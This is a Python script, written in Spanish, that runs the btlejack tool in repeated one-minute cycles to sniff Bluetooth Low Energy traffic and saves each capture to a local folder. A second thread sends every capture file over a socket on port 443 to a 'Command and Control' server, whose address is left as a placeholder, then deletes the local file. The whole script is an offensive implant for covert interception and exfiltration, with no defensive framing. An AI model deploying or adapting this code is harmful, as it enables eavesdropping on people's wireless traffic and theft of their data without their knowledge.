import threading
import time
import logging
import signal
import os
import subprocess
import socket

def handler(signum, frame):
    print("Cerrando programa")
    exit(1)

signal.signal(signal.SIGINT, handler)

logging.basicConfig(level=logging.DEBUG, format='(%(threadName)-9s) %(message)s',)

def enviar_command_control(e):
    while True:
        logging.debug('enviar_command_control Iniciado')
        e.wait()
        time.sleep(10) # da tiempo a que finalice btlejack y guarde los datos
        logging.debug('Enviando Información al Command and Control')
        obtener_archivos = os.listdir("capturas/")
        for g in obtener_archivos:
            cliente_enviar_datos(g)
            path_a_borrar = "capturas/"+g
            os.remove(path_a_borrar)
            logging.debug('Borrando archivo enviado')
        e.clear()

def sniffing_de_ble(e):
    while True:
        logging.debug('sniffing_de_ble Iniciado')
        logging.debug('Estoy lanzando un programa')
        tiempo = str(time.time_ns())
        path_archivo = "capturas/test"+tiempo+".txt"
        programa_a_abrir = abrir_programa(['btlejack',"-c","any","-x","ll_phdr","-o",path_archivo])
        time.sleep(60)
        cerrar_programa(programa_a_abrir)
        time.sleep(2)
        logging.debug('He terminado de lanzar el programa')
        e.set()
        logging.debug('Evento se ha seteado')

def abrir_programa(programa):
    return subprocess.Popen(programa)

def cerrar_programa(programa):
    programa.terminate()

def cliente_enviar_datos(nombre_archivo):
    SEPARATOR = "<SEPARATOR>"
    buffer_size = 4096
    host = "Introducir_IP_o_Dominio"
    port = 443
    tamano_archivo = os.path.getsize("capturas/"+nombre_archivo)
    s = socket.socket()
    print(f"[+] Connecting to {host}:{port}")
    s.connect((host,port))
    print("[+] Connected.")
    s.send(f"{nombre_archivo}{SEPARATOR}{tamano_archivo}".encode('utf-8'))
    with open("capturas/"+nombre_archivo, "rb") as f:
        while True:
            leer_bytes = f.read(buffer_size)
            if not leer_bytes:
                break
            s.sendall(leer_bytes)
    s.close()
    


if __name__ == '__main__':
    e = threading.Event()
    t1 = threading.Thread(name='Envio', target=enviar_command_control, args=(e,), daemon=True)
    t1.start()

    t2 = threading.Thread(name='Esnifando',target=sniffing_de_ble,args=(e,), daemon=True)
    t2.start()
    logging.debug('Procesos Trabajando')
    while True:
        time.sleep(1)

